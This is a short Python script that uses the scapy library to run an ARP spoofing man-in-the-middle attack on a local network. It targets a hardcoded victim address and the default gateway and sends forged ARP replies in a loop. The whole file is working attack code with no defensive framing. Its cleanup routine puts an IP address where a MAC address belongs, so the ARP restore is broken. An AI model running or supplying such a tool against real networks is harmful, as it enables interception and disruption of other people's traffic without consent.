#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys

victim = "192.168.0.218"  # input("Enter victim IP address: ")
gw = scapy.conf.route.route("0.0.0.0")[2]
packet_counter = 0

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f'[!] No response received for {ip}. Check network connectivity and permissions!')
        return None

def spoof(victim_ip, spoof_ip):
    global packet_counter

    target_mac = get_mac(victim_ip)
    if target_mac is None:
        print(f'[!] Could not get MAC address for {victim_ip}. Exiting...')
        return

    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

    packet_counter += 1

    print(f"\r [+] Standing in the middle of Gateway: {gw} and Victim: {victim}. Total packets sent: {packet_counter}",
          end="")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count=4, verbose=False)

try:
    while True:
        spoof(gw, victim)
        spoof(victim, gw)
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected User Interruption ... Resetting ARP table ... Please wait.\n")
    restore(victim, gw)
    restore(gw, victim)
    time.sleep(2)
    print("[+] Restoring Attempt Completed ... Quitting")
